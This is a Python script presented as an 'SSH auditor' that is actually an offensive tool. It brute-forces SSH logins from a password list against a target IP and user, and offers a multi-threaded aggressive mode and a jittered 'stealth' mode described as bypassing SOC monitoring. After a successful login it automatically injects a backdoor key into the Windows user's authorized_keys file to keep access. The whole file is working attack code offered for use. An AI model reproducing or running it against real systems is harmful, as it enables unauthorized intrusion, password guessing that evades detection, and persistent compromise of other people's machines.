#!/usr/bin/env python3
"""
🛡️ PriVi-Elite V3: Advanced SSH Auditor
Developed by Prince Ubebe | PriViSecurity
"""

import paramiko
import threading
import time
import os
import sys
import random
import socket
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.prompt import Prompt, IntPrompt

console = Console()
found_flag = False
success_password = None
log_messages = []

def update_logs(message):
    log_messages.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    if len(log_messages) > 12: 
        log_messages.pop(0)

class PriViEliteV3:
    def __init__(self, target, user, mode):
        self.target = target
        self.user = user
        self.mode = mode # 1: Aggressive, 2: Stealth, 3: Forensic
        # Mode 2 (Stealth) adds a random jitter between 2-5 seconds
        self.delay = 0 if mode == 1 else (random.uniform(2, 5) if mode == 2 else 0)

    def finger_print(self):
        """Grabs the SSH Banner before attacking."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target, 22))
            banner = sock.recv(1024).decode().strip()
            sock.close()
            return banner
        except Exception:
            return "Unknown SSH Service"

    def attempt_ssh(self, password, progress, task_id):
        global found_flag, success_password
        if found_flag: return

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if self.mode == 2: 
                time.sleep(self.delay) 
            
            client.connect(hostname=self.target, username=self.user, password=password, timeout=4)
            found_flag = True
            success_password = password
            update_logs(f"[bold green][SUCCESS][/bold green] Infiltrated: {password}")
            self.deploy_persistence(client)
        except paramiko.AuthenticationException:
            update_logs(f"[grey]Failed:[/grey] {password}")
        except Exception as e:
            update_logs(f"[red]Error:[/red] {str(e)[:20]}...")
        finally:
            client.close()
            progress.advance(task_id)

    def deploy_persistence(self, ssh_client):
        """Injects a backdoor SSH key (Post-Exploitation)."""
        try:
            update_logs("[bold blue][*] Injecting Persistence Key...[/bold blue]")
            # Creating .ssh directory on Windows
            ssh_client.exec_command('mkdir %USERPROFILE%\\.ssh')
            # Simulated RSA Key injection
            cmd = 'echo "ssh-rsa PRIVI-ELITE-V3-BACKDOOR-AUTHORIZED" >> %USERPROFILE%\\.ssh\\authorized_keys'
            ssh_client.exec_command(cmd)
            update_logs("[bold green][+] Persistence Established.[/bold green]")
        except Exception:
            update_logs("[red][!] Persistence Failed.[/red]")

def get_config():
    console.print(Panel("[bold green]PriVi-Security Elite V3 Configuration[/bold green]", expand=False))
    target = Prompt.ask("[bold white]Target IP[/bold white]", default="192.168.1.1")
    user = Prompt.ask("[bold white]Target Username[/bold white]", default="Admin")
    
    console.print("\n[1] [bold red]Aggressive[/bold red] (Fast, Multi-threaded)")
    console.print("[2] [bold yellow]Stealth[/bold yellow] (Slow Jitter, Bypasses SOC)")
    console.print("[3] [bold cyan]Forensic Scan[/bold cyan] (Banner Grabbing Only)")
    mode = IntPrompt.ask("\nSelect Mode", choices=[1, 2, 3])
    
    return target, user, mode

def main():
    target, user, mode = get_config()
    engine = PriViEliteV3(target, user, mode)
    
    # Pre-attack Fingerprinting
    banner = engine.finger_print()
    console.print(f"\n[bold magenta][*] Service Detected: {banner}[/bold magenta]\n")
    
    if mode == 3: 
        console.print("[bold cyan][*] Scan Complete. Forensic data logged.[/bold cyan]")
        return 

    if not os.path.exists("passlist.txt"):
        console.print("[bold red][!] Error: passlist.txt missing![/bold red]")
        return

    with open("passlist.txt", 'r') as f:
        passwords = [p.strip() for p in f.readlines()]

    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="logs", size=15)
    )
    
    layout["header"].update(Panel(f"[cyan]Exploiting: {target} | Mode: {mode}[/cyan]"))

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(pulse_style="magenta"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        
        task = progress.add_task("[cyan]Infiltrating SSH...", total=len(passwords))
        
        with Live(layout, refresh_per_second=4):
            for p in passwords:
                if found_flag: break
                
                # Multi-threading for Aggressive mode
                if mode == 1:
                    t = threading.Thread(target=engine.attempt_ssh, args=(p, progress, task))
                    t.start()
                    # Slow down slightly to prevent thread exhaustion
                    time.sleep(0.05) 
                else:
                    engine.attempt_ssh(p, progress, task)
                
                log_content = "\n".join(log_messages)
                layout["logs"].update(Panel(log_content, title="Attack Stream", border_style="blue"))

    if found_flag:
        console.print(Panel(f"[bold green]WINNER:[/bold green] [yellow]{success_password}[/yellow]\n[white]Persistence Injected.[/white]", title="Success"))
    else:
        console.print("[bold red][-] Mission Failed. No password matched.[/bold red]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Aborted by user.[/bold red]")
        sys.exit(0)
